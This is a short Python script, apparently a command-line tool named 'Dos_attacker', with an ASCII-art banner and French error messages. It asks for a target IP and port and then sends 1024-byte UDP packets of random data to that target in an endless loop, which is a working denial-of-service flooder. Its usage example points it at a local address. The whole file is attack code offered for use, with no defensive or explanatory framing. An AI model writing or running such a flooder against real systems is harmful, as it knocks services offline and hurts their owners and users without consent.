#-*-coding-Latin-1-

import socket
import random
from optparse import OptionParser

parser = OptionParser("""

________   ________    _________ 
\______ \  \_____  \  /   _____/ 
 |    |  \  /   |   \ \_____  \  
 |    `   \/    |    \/        \ 
/_______  /\_______  /_______  / 
        \/         \/        \/  attacker

[Options]:
		
				-t : target_IP
				-p : port
Exemple : python Dos_attacker.py -t 192.168.1.1 -p 80

""")
parser.add_option("-t", dest="target_IP", help="Enter you target_IP")
parser.add_option("-p", dest="port", help="Enter the port")
(options, args) = parser.parse_args()



try :
	target_IP = options.target_IP
	port = int(options.port)

	def Dos_attack(target_IP, port):
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		packet = random._urandom(1024)
		while True :
			sock.sendto(packet,(target_IP,port))
			print((packet.encode('hex')))

except :
	parser.error("L'exemple est devant vous !!")

Dos_attack(target_IP, port)